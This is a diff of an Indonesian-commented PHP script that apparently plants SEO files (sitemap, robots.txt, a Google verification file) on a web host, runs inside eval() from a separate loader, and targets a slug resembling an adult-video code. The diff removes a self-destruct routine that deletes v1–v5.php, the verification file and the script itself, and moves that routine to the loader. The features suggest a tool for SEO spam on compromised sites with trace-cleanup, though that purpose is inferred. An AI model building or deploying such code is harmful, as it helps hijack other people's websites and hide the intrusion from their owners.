@@ -275,8 +275,7 @@ function tampilkan_log_terminal($logs, $next_action = 'status', $json_filename =
     $step2_url = $self_script_name . '?action=generate_step2&json_file=' . urlencode($json_filename);
     $status_url = $self_script_name . '?status=completed&json_file=' . urlencode($json_filename);
     $check_slug_url = 'https://' . $clean_host . '/wanz-895-eng-sub'; 
-    // CATATAN: Jika slug ini salah, Anda harus mengubahnya di sini.
-    // Berdasarkan file JSON Anda, slug ini BENAR.
+    // CATATAN: Pastikan slug ini ada di file JSON Anda. Berdasarkan image_d23ad9.png, slug ini ADA.
 
     echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Processing...</title>
     <style>
@@ -376,98 +375,6 @@ function tampilkan_log_terminal($logs, $next_action = 'status', $json_filename =
 
 
 /**
- * Fungsi hapus_skrip_sendiri (Halaman 1: Salin)
- * [MODIFIKASI]
- */
-function hapus_skrip_sendiri() {
-    global $self_script_name, $full_domain_url;
-
-    header('Content-Type: text/html'); 
-    $domain_to_show = htmlspecialchars($full_domain_url);
-
-    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Delete Script</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
-        .terminal { max-width: 600px; width: 100%; background: #111; border: 1px solid #333; padding: 0; }
-        .terminal-header { padding: 15px 20px; border-bottom: 1px solid #333; display: flex; align-items: center; gap: 8px; }
-        .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
-        .red { background: #ff5f57; } .yellow { background: #ffbd2e; } .green { background: #28ca42; }
-        .terminal-content { padding: 20px; font-size: 11px; line-height: 1.4; }
-        .log-entry { margin-bottom: 10px; display: flex; align-items: flex-start; gap: 8px; }
-        .timestamp { color: #666; min-width: 70px; font-size: 10px; }
-        .log-info { color: #0095ff; }
-        .log-warning { color: #ffbd2e; } 
-        .typing { border-right: 1px solid #fff; animation: blink 1s infinite; }
-        @keyframes blink { 0%, 50% { border-color: #fff; } 51%, 100% { border-color: transparent; } }
-        .command-line { display: flex; align-items: center; gap: 6px; margin-top: 15px; }
-        .prompt { color: #28ca42; font-size: 11px; }
-        .cursor { background: #fff; width: 6px; height: 12px; animation: blink 1s infinite; }
-        .domain-display { background: #1a1a1a; border: 1px solid #333; padding: 8px 12px; margin: 10px 0; font-size: 10px; color: #ffd60a; }
-    </style>
-    </head>
-    <body>
-        <div class="terminal">
-            <div class="terminal-header">
-                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
-                <div style="color: #666; font-size: 10px;">delete.script (Step 1 of 2)</div>
-            </div>
-            <div class="terminal-content" id="terminalContent">
-                <div id="logsContainer"></div>
-                <div class="domain-display">Domain: ' . $domain_to_show . '</div>
-                <div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>
-            </div>
-        </div>
-    <script>
-        const logs = [
-            {timestamp: "' . date('H:i:s') . '", type: "info", message: "Memulai proses penghapusan skrip..."},
-            {timestamp: "' . date('H:i:s') . '", type: "warning", message: "PERINGATAN: Pastikan domain telah di verifikasi di Google."},
-            {timestamp: "' . date('H:i:s') . '", type: "warning", message: "File \'google...html\' dan \'v*.php\' akan dihapus permanen."},
-            {timestamp: "' . date('H:i:s') . '", type: "info", message: "Tekan ENTER untuk MENYALIN domain dan lanjut ke konfirmasi."}
-        ];
-        const container = document.getElementById("logsContainer");
-        let currentLog = 0; let currentChar = 0; let currentLine = null;
-        
-        function typeNextChar() {
-            if (currentLog >= logs.length) {
-                document.addEventListener("keydown", function(e) {
-                    if (e.key === "Enter") {
-                        navigator.clipboard.writeText("' . $domain_to_show . '").then(() => {
-                            // [DIUBAH] Arahkan ke halaman konfirmasi baru
-                            window.location.href = \'' . $self_script_name . '?action=delete_confirm_prompt\';
-                        }).catch(err => {
-                            // Jika clipboard gagal, tetap lanjut
-                            window.location.href = \'' . $self_script_name . '?action=delete_confirm_prompt\';
-                        });
-                    }
-                }, { once: true });
-                return;
-            }
-            const log = logs[currentLog];
-            if (currentChar === 0) {
-                currentLine = document.createElement("div");
-                currentLine.className = "log-entry";
-                currentLine.innerHTML = \'<span class="timestamp">\' + log.timestamp + \'</span><span class="log-\' + log.type + \' typing"></span>\';
-                container.appendChild(currentLine);
-            }
-            const messageElement = currentLine.querySelector(".typing");
-            if (currentChar < log.message.length) {
-                messageElement.textContent = log.message.substring(0, currentChar + 1);
-                currentChar++;
-                setTimeout(typeNextChar, 8);
-            } else {
-                messageElement.classList.remove("typing");
-                currentChar = 0;
-                currentLog++;
-                setTimeout(typeNextChar, 50);
-            }
-        }
-        setTimeout(typeNextChar, 200);
-    </script>
-    </body></html>';
-}
-
-/**
  * [FUNGSI BARU] tampilkan_konfirmasi_hapus (Halaman 2: Konfirmasi)
  */
 function tampilkan_konfirmasi_hapus() {
@@ -554,6 +461,7 @@ function tampilkan_konfirmasi_hapus() {
 
 /**
  * Fungsi tampilkan_status_selesai
+ * [LOGIKA HAPUS (action=delete) DIPINDAHKAN DARI SINI KE LOADER]
  */
 function tampilkan_status_selesai() {
     global $clean_host, $self_script_name, $base_json_url_path,
@@ -571,7 +479,8 @@ function tampilkan_status_selesai() {
     $robots_exists = file_exists($local_robots_path);
     $sitemap_exists = file_exists($local_sitemap_path);
     
-    $is_deleted = !file_exists($self_script_name);
+    // Logika is_deleted ini mungkin tidak akurat karena skrip ini berjalan di dalam eval()
+    $is_deleted = !file_exists($self_script_name); 
     $json_accessible = !empty($derived_json_url) ? cek_url_json($derived_json_url) : false;
     
     $all_files_ok = $json_exists && $config_exists && $google_exists && $robots_exists && $sitemap_exists;
@@ -635,6 +544,7 @@ function tampilkan_status_selesai() {
         function typeNextChar() {
             if (currentLog >= logs.length) {
                 if (action_type === "delete") {
+                    // [DIUBAH] Panggil halaman delete (yang sekarang ada di loader)
                     setTimeout(() => { window.location.href = \'' . $self_script_name . '?action=delete\'; }, 500);
                 }
                 document.addEventListener("keydown", function(e) {
@@ -676,7 +586,7 @@ function tampilkan_status_selesai() {
 }
 
 
-// --- [ROUTER UTAMA (DIMODIFIKASI)] ---
+// --- [ROUTER UTAMA (LOGIKA DELETE DIHAPUS)] ---
 
 if (isset($_GET['action']) && $_GET['action'] === 'generate') {
     jalankan_proses_seo_part1();
@@ -688,90 +598,8 @@ if (isset($_GET['action']) && $_GET['action'] === 'generate_step2') {
     exit;
 }
 
-if (isset($_GET['action']) && $_GET['action'] === 'delete' && !isset($_GET['confirm'])) {
-    hapus_skrip_sendiri(); // Memanggil Halaman 1 (Salin)
-    exit;
-}
-
-// --- [BLOK BARU UNTUK HALAMAN 2 (KONFIRMASI)] ---
-if (isset($_GET['action']) && $_GET['action'] === 'delete_confirm_prompt') {
-    tampilkan_konfirmasi_hapus(); // Memanggil Halaman 2 (Konfirmasi Hapus)
-    exit;
-}
-// --- [AKHIR BLOK BARU] ---
-
-
-// --- [BLOK PENGHAPUSAN (TETAP SAMA)] ---
-if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
-    global $server_path, $local_google_path, $self_script_path, $full_domain_url;
-
-    $files_to_delete = [
-        $server_path . '/v1.php',
-        $server_path . '/v2.php',
-        $server_path . '/v3.php',
-        $server_path . '/v4.php',
-        $server_path . '/v5.php',
-        $server_path . '/vx.php',
-        $local_google_path 
-    ];
-
-    $deleted_files_log = [];
-
-    foreach ($files_to_delete as $file) {
-        if (file_exists($file)) {
-            if (@unlink($file)) {
-                $deleted_files_log[] = basename($file) . ' ... Dihapus';
-            } else {
-                $deleted_files_log[] = basename($file) . ' ... Gagal Dihapus (Periksa Izin)';
-            }
-        }
-    }
-
-    if (@unlink($self_script_path)) {
-        $deleted_files_log[] = basename($self_script_path) . ' ... Dihapus (Self-destruct)';
-        $self_delete_success = true;
-    } else {
-        $deleted_files_log[] = basename($self_script_path) . ' ... GAGAL Dihapus (Self-destruct)';
-        $self_delete_success = false;
-    }
-
-    header('Content-Type: text/html');
-    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Script Deleted</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
-        .terminal { max-width: 600px; width: 100%; background: #111; border: 1px solid #333; padding: 0; }
-        .terminal-header { padding: 15px 20px; border-bottom: 1px solid #333; display: flex; align-items: center; gap: 8px; }
-        .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
-        .red { background: #ff5f57; } .yellow { background: #ffbd2e; } .green { background: #28ca42; }
-        .terminal-content { padding: 20px; font-size: 11px; line-height: 1.4; }
-        .log-entry { margin-bottom: 10px; display: flex; align-items: flex-start; gap: 8px; }
-        .timestamp { color: #666; min-width: 70px; font-size: 10px; }
-        .log-success { color: #28ca42; }
-        .log-error { color: #ff5f57; }
-    </style>
-    </head>
-    <body>
-        <div class="terminal">
-            <div class="terminal-header">
-                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
-                <div style="color: #666; font-size: 10px;">delete.script</div>
-            </div>
-            <div class="terminal-content">';
-    
-    foreach ($deleted_files_log as $log) {
-        $log_type = (strpos($log, 'GAGAL') !== false) ? 'log-error' : 'log-success';
-        echo '<div class="log-entry"><span class="timestamp">' . date('H:i:s') . '</span><span class="' . $log_type . '">' . htmlspecialchars($log) . '</span></div>';
-    }
-
-    if ($self_delete_success) {
-        echo '<div class="log-entry"><span class="timestamp">' . date('H:i:s') . '</span><span style="color: #666;">Domain disalin ke clipboard: ' . htmlspecialchars($full_domain_url) . '</span></div>';
-        echo '<div class="log-entry"><span class="timestamp">' . date('H:i:s') . '</span><span style="color: #666;">Semua operasi selesai</span></div>';
-    }
-
-    echo '</div></div></body></html>';
-    exit;
-}
+// Blok delete (action=delete, action=delete_confirm_prompt, action=delete&confirm=yes)
+// TELAH DIHAPUS DARI SINI. Logika itu sekarang ada di file loader (Bagian 1).
 
 if (isset($_GET['status'])) {
     tampilkan_status_selesai();
